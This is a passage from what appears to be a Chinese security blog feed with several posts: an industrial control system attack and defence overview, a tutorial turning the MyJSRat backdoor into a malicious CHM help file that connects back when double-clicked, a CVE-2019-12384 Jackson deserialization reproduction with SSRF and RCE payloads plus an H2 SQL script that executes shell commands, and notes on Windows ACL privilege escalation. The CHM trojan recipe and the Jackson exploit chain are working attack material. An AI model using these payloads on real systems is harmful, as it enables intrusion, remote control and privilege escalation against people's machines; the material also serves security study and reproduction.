title="工业以太网链路漏洞"></a>工业以太网链路漏洞</h3><ul><li>MAC泛洪攻击</li><li>ARP溢出/中间人攻击</li><li>环网beacon协议攻击</li><li>VLAN跳转攻击</li><li>交换机WEB漏洞攻击</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093617.png-water_print" alt=""></p><h3 id="主机安全漏洞"><a href="#主机安全漏洞" class="headerlink" title="主机安全漏洞"></a>主机安全漏洞</h3><ul><li>防火墙关闭</li><li>没有杀软防护</li><li>缺乏USB准入</li><li>Windows本身漏洞<ul><li>SMB v1.0 Port 445</li><li>RDP Port 3389</li><li>AD域攻击</li><li>DNS污染攻击</li></ul></li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093626.png-water_print" alt=""></p><h3 id="组态软件漏洞"><a href="#组态软件漏洞" class="headerlink" title="组态软件漏洞"></a>组态软件漏洞</h3><ul><li>DoS拒绝服务攻击</li><li>缓冲区溢出漏洞</li><li>COM服务组件未授权访问漏洞</li><li>SQL数据库注入漏洞</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093637.png-water_print" alt=""></p><h3 id="物理安全漏洞"><a href="#物理安全漏洞" class="headerlink" title="物理安全漏洞"></a>物理安全漏洞</h3><ul><li>设备所在地无防护</li><li>机房机柜未上锁</li><li>网络端口未加固</li><li>控制器钥匙未拔出</li><li>供电电源为单路</li><li>接地系统不完善</li></ul><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093645.png-water_print" alt=""></p><h2 id="工业控制系统渗透工具利用"><a href="#工业控制系统渗透工具利用" class="headerlink" title="工业控制系统渗透工具利用"></a>工业控制系统渗透工具利用</h2><h3 id="Demo场景"><a href="#Demo场景" class="headerlink" title="Demo场景"></a>Demo场景</h3><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728093655.png-water_print" alt=""></p><h3 id="nmap指纹扫描"><a href="#nmap指纹扫描" class="headerlink" title="nmap指纹扫描"></a>nmap指纹扫描</h3><pre><code>nmap -p port --script scada protocol ip address</code></pre><p>参考：<a href="https://github.com/jianshting/NMAP-NSE-SCADA" target="_blank" rel="noopener">https://github.com/jianshting/NMAP-NSE-SCADA</a></p><h3 id="Yersinia二层网络的攻击"><a href="#Yersinia二层网络的攻击" class="headerlink" title="Yersinia二层网络的攻击"></a>Yersinia二层网络的攻击</h3><pre><code>Yersinia -G</code></pre><p>参考：<a href="https://github.com/tomcat/yersinia" target="_blank" rel="noopener">https://github.com/tomcat/yersinia</a></p><h3 id="Snap7协议层的攻击"><a href="#Snap7协议层的攻击" class="headerlink" title="Snap7协议层的攻击"></a>Snap7协议层的攻击</h3><ul><li>s7 Client.exe</li></ul><h3 id="MSF主机攻击和后渗透"><a href="#MSF主机攻击和后渗透" class="headerlink" title="MSF主机攻击和后渗透"></a>MSF主机攻击和后渗透</h3><ul><li>对PC主机的渗透和控制(和传统内网渗透一样)</li></ul><h3 id="ISF工控渗透工具"><a href="#ISF工控渗透工具" class="headerlink" title="ISF工控渗透工具"></a>ISF工控渗透工具</h3><ul><li>开源的工控渗透框架</li></ul><p>参考：<a href="https://github.com/dark-lbp/isf" target="_blank" rel="noopener">https://github.com/dark-lbp/isf</a></p><h2 id="工业控制系统安全防御"><a href="#工业控制系统安全防御" class="headerlink" title="工业控制系统安全防御"></a>工业控制系统安全防御</h2><h3 id="区域边界"><a href="#区域边界" class="headerlink" title="区域边界"></a>区域边界</h3><p>工业防火墙、区域防火墙、网闸</p><h3 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h3><p>交换机空余端口关闭、native VLAN、禁用CDP或：LLDP、握手包报文加密</p><h3 id="主机安全"><a href="#主机安全" class="headerlink" title="主机安全"></a>主机安全</h3><p>杀软、防火墙、基线安全、U口准入、应用白名单</p><h3 id="控制器安全"><a href="#控制器安全" class="headerlink" title="控制器安全"></a>控制器安全</h3><p>协议加密、注入控制、身份认证</p><h3 id="物理安全"><a href="#物理安全" class="headerlink" title="物理安全"></a>物理安全</h3><p>接地安全、双路供电、电柜上锁</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 工控安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工控安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MyJSRat结合CHM命令执行</title>
      <link href="/2019/07/28/myjsrat-jie-he-chm-ming-ling-zhi-xing/"/>
      <url>/2019/07/28/myjsrat-jie-he-chm-ming-ling-zhi-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="MyJSRat结合CHM命令执行"><a href="#MyJSRat结合CHM命令执行" class="headerlink" title="MyJSRat结合CHM命令执行"></a>MyJSRat结合CHM命令执行</h1><h2 id="MyJSRat"><a href="#MyJSRat" class="headerlink" title="MyJSRat"></a>MyJSRat</h2><blockquote><p>MyJSRat 是JSBackdoor的python版本</p></blockquote><p>下载地址:<a href="https://github.com/Ridter/MyJSRat" target="_blank" rel="noopener">https://github.com/Ridter/MyJSRat</a></p><h2 id="Easy-CHM"><a href="#Easy-CHM" class="headerlink" title="Easy CHM"></a>Easy CHM</h2><blockquote><p>CHM是英语“Compiled Help Manual”的简写，即“已编译的帮助文件”。CHM是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。</p></blockquote><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="下载MyJSRat并运行"><a href="#下载MyJSRat并运行" class="headerlink" title="下载MyJSRat并运行"></a>下载MyJSRat并运行</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/Ridter/MyJSRat</code></pre><pre class=" language-bash"><code class="language-bash">python MyJSRat.py -i IPaddr -p port</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728170038.png-water_print" alt=""></p><h3 id="下载wtf文件"><a href="#下载wtf文件" class="headerlink" title="下载wtf文件"></a>下载wtf文件</h3><p>浏览器访问<code>https://IPaddr:port/wtf</code>，并保存至txt文件中<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728170053.png-water_print" alt=""></p><h3 id="将上面保存的代码写入到如下代码的Item1的Value值中"><a href="#将上面保存的代码写入到如下代码的Item1的Value值中" class="headerlink" title="将上面保存的代码写入到如下代码的Item1的Value值中"></a>将上面保存的代码写入到如下代码的Item1的Value值中</h3><p><code>注</code>：要在rundll32.exe前后添加<code>,</code></p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Mousejack replay<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>command exec <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OBJECT</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>x</span> <span class="token attr-name">classid</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span>1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PARAM</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Command<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ShortCut<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PARAM</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Button<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Bitmap::shortcut<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PARAM</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Item1<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>,rundll32.exe,<span class="token punctuation">'</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PARAM</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Item2<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>273,1,1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>OBJECT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCRIPT</span><span class="token punctuation">></span></span><span class="token script language-javascript">x<span class="token punctuation">.</span><span class="token function">Click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728170128.png-water_print" alt=""></p><h3 id="保存为HTML文件"><a href="#保存为HTML文件" class="headerlink" title="保存为HTML文件"></a>保存为HTML文件</h3><p>新建目录，将上述代码保存在新建文件夹中</p><h3 id="通过EasyCHM制作CHM文件"><a href="#通过EasyCHM制作CHM文件" class="headerlink" title="通过EasyCHM制作CHM文件"></a>通过EasyCHM制作CHM文件</h3><p>通过EasyCHM编译exp.html文件<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728170140.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728170151.png-water_print" alt=""></p><h3 id="双击上线"><a href="#双击上线" class="headerlink" title="双击上线"></a>双击上线</h3><p>此时只要双击test.CHM文件，即可上线<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190728170201.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-12384：Jackson反序列化漏洞复现</title>
      <link href="/2019/07/26/jackson-fan-xu-lie-hua-lou-dong-fu-xian/"/>
      <url>/2019/07/26/jackson-fan-xu-lie-hua-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2019-12384：Jackson反序列化漏洞复现"><a href="#CVE-2019-12384：Jackson反序列化漏洞复现" class="headerlink" title="CVE-2019-12384：Jackson反序列化漏洞复现"></a>CVE-2019-12384：Jackson反序列化漏洞复现</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>根据Jackson开发者提到的信息，触发这个Jackson漏洞需要满足如下要求，所以该漏洞评级为中危：</p><ol><li>目标应用接收到不可信客户端发送的JSON数据</li><li>目标应用使用多态类型处理方式来处理java.lang.Object类型的属性；</li><li>目标应用至少包含能够在Java classpath中利用的一个“gadget”类。在该漏洞中就是依赖的第三方jar包有点多，除去jackson自身的jar包以外还需要logback-core和h2；</li></ol><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本文中用到的第三方库有：</p><ul><li>jackson-databind 2.9.8</li><li>jackson-annotations-2.9.8.jar</li><li>jackson-core-2.9.8.jar</li><li>logback-core-1.3.0-alpha4.jar</li><li>h2 1.4.199</li></ul><p>在<a href="http://www.mvnrepository.com" target="_blank" rel="noopener">http://www.mvnrepository.com</a>上下载即可。</p><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>baiyang<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>ObjectMapper<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>SerializationFeature<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>h2<span class="token punctuation">.</span>Driver<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.h2.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Mapping"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//该条payload用于SSRF的复现</span>        String SSRF <span class="token operator">=</span> <span class="token string">"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://127.0.0.1:4444/~/hacker\"}]"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//该条payload用于RCE的复现</span>        String RCE <span class="token operator">=</span> <span class="token string">"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost/inject.sql'\"}]"</span><span class="token punctuation">;</span>        ObjectMapper mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mapper<span class="token punctuation">.</span><span class="token function">configure</span><span class="token punctuation">(</span>SerializationFeature<span class="token punctuation">.</span>FAIL_ON_EMPTY_BEANS<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Serializing"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object obj <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//更换SSRF或RCE即可测试SSRF或者RCE漏洞的payload</span>            obj <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>RCE<span class="token punctuation">,</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"objectified"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stringified: "</span> <span class="token operator">+</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="构建步骤"><a href="#构建步骤" class="headerlink" title="构建步骤"></a>构建步骤</h3><p>本文在IDEA上生成项目</p><ol><li>新建java Commandline项目</li><li>将上述代码替换类</li><li>单击红框中的图标，进入项目结构设置<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153817.png-water_print" alt=""></li><li>按照下图的步骤将下载好的外部jar包导入项目文件<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726153826.png-water_print" alt=""></li></ol><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol><li>将下面的sql脚本文件保存为<code>inject.sql</code><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> ALIAS SHELLEXEC <span class="token keyword">AS</span> $$ String shellexec<span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> throws java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException {     String<span class="token punctuation">[</span><span class="token punctuation">]</span> command <span class="token operator">=</span> {<span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> cmd}<span class="token punctuation">;</span>     java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner s <span class="token operator">=</span> new java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span>getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">.</span>getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>useDelimiter<span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> s<span class="token punctuation">.</span>hasNext<span class="token punctuation">(</span><span class="token punctuation">)</span> ? s<span class="token punctuation">.</span><span class="token keyword">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> : <span class="token string">""</span><span class="token punctuation">;</span>  }$$<span class="token punctuation">;</span><span class="token keyword">CALL</span> SHELLEXEC<span class="token punctuation">(</span><span class="token string">'open /Applications/Calculator.app'</span><span class="token punctuation">)</span></code></pre></li></ol><p><code>注</code>：本文在MacOS下执行的RCE，如在其它环境，请自行更换CALL SHELLEXEC中的命令。</p><ol start="2"><li>执行本地执行python2 -m SimpleHTTPServer 80，在本地启动HTTP服务</li></ol><h3 id="RCE-payload测试"><a href="#RCE-payload测试" class="headerlink" title="RCE payload测试"></a>RCE payload测试</h3><p>将java文件中的payload更换为<code>RCE</code>，编译并运行java程序<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726154643.png-water_print" alt=""></p><h3 id="SSRF-payload测试"><a href="#SSRF-payload测试" class="headerlink" title="SSRF payload测试"></a>SSRF payload测试</h3><ol><li>执行<code>nc -l -vv 4444</code>，便于观察SSRF的结果</li><li>将java文件中的payload更换为<code>SSRF</code>，编译并运行java程序<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190726155103.png-water_print" alt=""></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html" target="_blank" rel="noopener">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></li><li><a href="https://www.anquanke.com/post/id/182695" target="_blank" rel="noopener">https://www.anquanke.com/post/id/182695</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Jackson-databind </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos内网安全——组策略与ACL</title>
      <link href="/2019/07/24/kerberos-nei-wang-an-quan-zu-ce-lue-yu-acl/"/>
      <url>/2019/07/24/kerberos-nei-wang-an-quan-zu-ce-lue-yu-acl/</url>
      
        <content type="html"><![CDATA[<h1 id="组策略的部署及下发原理"><a href="#组策略的部署及下发原理" class="headerlink" title="组策略的部署及下发原理"></a>组策略的部署及下发原理</h1><ul><li>本地组策略和域内组策略</li><li>域服务器如何存储组策略</li><li>组策略的下发和获取</li><li>客户端如何存储组策略</li></ul><h2 id="Server-Manager的组策略管理工具"><a href="#Server-Manager的组策略管理工具" class="headerlink" title="Server Manager的组策略管理工具"></a>Server Manager的组策略管理工具</h2><p>更专业的组策略管理工具GPMC，可以管理多个域<br>创建并编辑组策略的内容<br>组策略分作主机策略和用户策略，machine和users目录；<br>脚本类型和非脚本类型, script目录<br>管理组策略的应用范围(演示)</p><h2 id="组策略的存储"><a href="#组策略的存储" class="headerlink" title="组策略的存储"></a>组策略的存储</h2><p>存储在服务器中，\domain\sysvol\policies，以明文方式存储为xml、ini、inf等文件<br>对域内所有用户开放读权限</p><h2 id="组策略的更新"><a href="#组策略的更新" class="headerlink" title="组策略的更新"></a>组策略的更新</h2><ul><li>客户端每90分钟主动获取一次组策略，检查组策略是否发生变更</li><li>客户端使用<code>gpupdate /force</code>强制立即检查组策略</li><li>参数可以分为主机和用户，<code>gpupdate /force /target:computer</code></li></ul><h2 id="组策略的下发和获取"><a href="#组策略的下发和获取" class="headerlink" title="组策略的下发和获取"></a>组策略的下发和获取</h2><p>组策略的查询原理：<br>LDAP检索所有的组策略，那些属于自己的<br>查询组策略，服务器决定需要返回哪些策略（版本号是决定的重要因素）</p><h1 id="ACL访问控制链"><a href="#ACL访问控制链" class="headerlink" title="ACL访问控制链"></a>ACL访问控制链</h1><h2 id="Access-Control-Link"><a href="#Access-Control-Link" class="headerlink" title="Access Control Link"></a>Access Control Link</h2><ul><li>Windows安全对象的ACL</li><li>所有的Windows对象都称为安全对象，文件、进程、注册表、内存等</li><li>为每个安全对象赋予一个安全描述符(Security descriptor)</li><li>Security identifiers (SIDs)for the owner and primary group of an object</li><li>A DACL that specifies the access rights allowed or denied to particular users or groups</li><li>a SACL that specifies the types of access attempts that generate audit records for the object</li></ul><h2 id="DACL"><a href="#DACL" class="headerlink" title="DACL"></a>DACL</h2><p>DACL由多个ACE(Access Control Entry)组成<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190724213505.png-water_print" alt=""></p><h2 id="Windows的访问控制"><a href="#Windows的访问控制" class="headerlink" title="Windows的访问控制"></a>Windows的访问控制</h2><ul><li>Windows的访问控制包括三部分:访问令牌、对象安全描述符和访问检查</li><li>访问令牌作为一个容器，通过Token体现</li><li>对象安全描述符表示目标对象的安全属性，通过安全矩阵详细描述该对象赋予不同用户组的权限</li><li>访问检查表示通过比较访问令牌和ACL，以决定该进程是否具有访问时申请的相应权限<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190724213519.png-water_print" alt=""></li></ul><p>Windows中高权限服务、进程所拥有的文件、目录如果存在着ACL设置不当，对低权限用户开放了“写”甚至“执行”权限，低权限用户可以通过修改、替换文件内容来达到执行指定代码的目的。例如Windows的System332目录如果开放了写权限,则可以向目录写入一个DLL,等待系统重新启动是,由 Svchost等程序加载即可实现权限提升(演示)</p><h2 id="ACL安全审计"><a href="#ACL安全审计" class="headerlink" title="ACL安全审计"></a>ACL安全审计</h2><p>Sysinternalsuit提供的accesschk.exe可以对指定的目录、文件进行ACL检查，命令为accesschk.exe -w -s directory 其中directory为需要检测的目录</p><p>accesschk.exe,可以审计进程对所有用户组开放的权限。采用规则accesschk.exe -ppid可以获取某个进程开放的权限，其中pid可以用‘*’代，表示检测所有进程对不同用户组开放的权限。为了保证正常运行,运行Taccesschk.exe时需要较高的权限</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190724213529.png-water_print" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>进程ACL漏洞的利用方法</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>通过OpenProcess获取进程句柄，并将目标代码写入该进程空间中，以该进程的权限运行这些代码，运行代码权限为该进程权限；</p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>通过OpenProcess获取进程句柄，再通过OpenProcessToken获取该进程的Token，并利用该Tokeni通过CreateProcessAsUser新的进程，新的进程权限和目标进程权限一致。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190724213426.png-water_print" alt=""><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190724213552.png-water_print" alt=""></p><h2 id="注册表的ACL"><a href="#注册表的ACL" class="headerlink" title="注册表的ACL"></a>注册表的ACL</h2><p>注册表中的启动项、服务加载项如果对低权限用户开发了写权限，低权限用户可以向这些表项写入指定的文件，等待系统重新启动后实现权限提升<br>使用命令accesschk.exe -w -s -k HKLM，表示递归的扫描HKLM中开放了写权限的表项</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Kerberos </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kerberos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis基于主从复制的RCE利用方式</title>
      <link href="/2019/07/15/redis-ji-yu-zhu-cong-fu-zhi-de-rce-li-yong-fang-shi/"/>
      <url>/2019/07/15/redis-ji-yu-zhu-cong-fu-zhi-de-rce-li-yong-fang-shi/</url>
      
